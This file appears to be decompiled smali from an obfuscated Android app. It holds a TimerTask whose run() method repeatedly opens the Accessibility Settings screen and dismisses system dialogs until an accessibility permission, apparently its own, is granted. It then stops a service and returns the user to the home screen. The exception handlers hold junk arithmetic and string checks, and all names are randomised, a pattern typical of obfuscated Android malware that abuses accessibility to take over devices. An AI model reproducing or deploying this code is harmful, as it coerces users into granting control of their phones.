.class final Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/D;
.super Ljava/util/TimerTask;


# instance fields
.field private synthetic a:Landroid/content/Intent;

.field private synthetic a:Ljava/util/Timer;

.field private synthetic a:Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/C;


# direct methods
.method constructor <init>(Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/C;Landroid/content/Intent;Ljava/util/Timer;)V
    .locals 0

    iput-object p1, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/D;->a:Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/C;

    iput-object p2, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/D;->a:Landroid/content/Intent;

    iput-object p3, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/D;->a:Ljava/util/Timer;

    invoke-direct {p0}, Ljava/util/TimerTask;-><init>()V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 3

    :try_start_0
    sget-object v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/I;->h:Ljava/lang/String;

    iget-object v1, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/D;->a:Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/C;

    iget-object v1, v1, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/C;->a:Landroid/content/Context;

    invoke-static {v0, v1}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a(Ljava/lang/String;Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_1

    iget-object v0, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/D;->a:Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/C;

    iget-object v0, v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/C;->a:[I

    const/4 v1, 0x0

    const/16 v2, 0xc8

    aput v2, v0, v1

    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.settings.ACCESSIBILITY_SETTINGS"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    iget-object v1, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/D;->a:Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/C;

    iget-object v1, v1, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/C;->a:Landroid/content/Context;

    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    iget-object v0, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/D;->a:Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/C;

    iget-object v0, v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/C;->a:Landroid/content/Context;

    new-instance v1, Landroid/content/Intent;

    const-string v2, "android.intent.action.CLOSE_SYSTEM_DIALOGS"

    invoke-direct {v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V

    :cond_0
    :goto_0
    return-void

    :cond_1
    iget-object v0, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/D;->a:Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/C;

    iget-object v0, v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/C;->a:Landroid/content/Context;

    iget-object v1, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/D;->a:Landroid/content/Intent;

    invoke-virtual {v0, v1}, Landroid/content/Context;->stopService(Landroid/content/Intent;)Z

    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.intent.action.MAIN"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v1, "android.intent.category.HOME"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    iget-object v1, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/D;->a:Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/C;

    iget-object v1, v1, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/C;->a:Landroid/content/Context;

    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    iget-object v0, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/D;->a:Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/C;

    const/4 v1, 0x0

    iput-boolean v1, v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/C;->a:Z

    iget-object v0, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/D;->a:Ljava/util/Timer;

    invoke-virtual {v0}, Ljava/util/Timer;->cancel()V

    iget-object v0, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/D;->a:Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/C;

    iget-object v0, v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/C;->a:[I

    const/4 v1, 0x0

    const/4 v2, 0x0

    aput v2, v0, v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    :try_start_1
    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    const/16 v1, 0x2c

    if-gt v0, v1, :cond_0

    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    div-int/lit8 v0, v0, 0x2

    const v1, 0x1527e

    mul-int/2addr v0, v1

    const v1, 0x1594f

    if-lt v0, v1, :cond_0

    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    div-int/lit8 v0, v0, 0x2

    const v1, 0xaa22

    mul-int/2addr v0, v1

    const/16 v1, 0x39fa

    if-lt v0, v1, :cond_0

    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    const v1, 0x15225

    if-ge v0, v1, :cond_3

    const v0, 0x12521

    sget v1, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    if-ne v0, v1, :cond_2

    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    const/16 v0, 0x13

    sget v1, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    if-ge v0, v1, :cond_3

    :cond_2
    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    const/16 v1, 0x25

    if-ge v0, v1, :cond_3

    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    const/16 v1, -0x5fbd

    if-ge v0, v1, :cond_0

    :cond_3
    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    const v1, 0x16648

    if-le v0, v1, :cond_4

    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    const v1, 0xf266

    if-ne v0, v1, :cond_5

    const-string v0, "jtuuz"

    const-string v1, "no"

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_5

    :cond_4
    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    if-gtz v0, :cond_6

    :cond_5
    const-string v0, "chwrykfwbrqectbqcev"

    const-string v1, "gcyque"

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_b

    :cond_6
    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    const v1, 0x1631a

    if-le v0, v1, :cond_7

    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    const v1, 0x13ca7

    if-ne v0, v1, :cond_8

    const-string v0, "entxj"

    const-string v1, "np"

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_8

    :cond_7
    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    if-gtz v0, :cond_9

    :cond_8
    const-string v0, "jpypvacuvyvsrysxced"

    const-string v1, "qscyww"

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_a

    :cond_9
    const/16 v0, 0x2170

    sput v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    const v0, 0x63f65

    sput v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    :cond_a
    const/16 v0, 0x1000

    sput v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    :cond_b
    const/16 v0, 0x2f31

    sput v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto/16 :goto_0

    :catch_1
    move-exception v0

    invoke-static {}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a()V

    goto/16 :goto_0
.end method
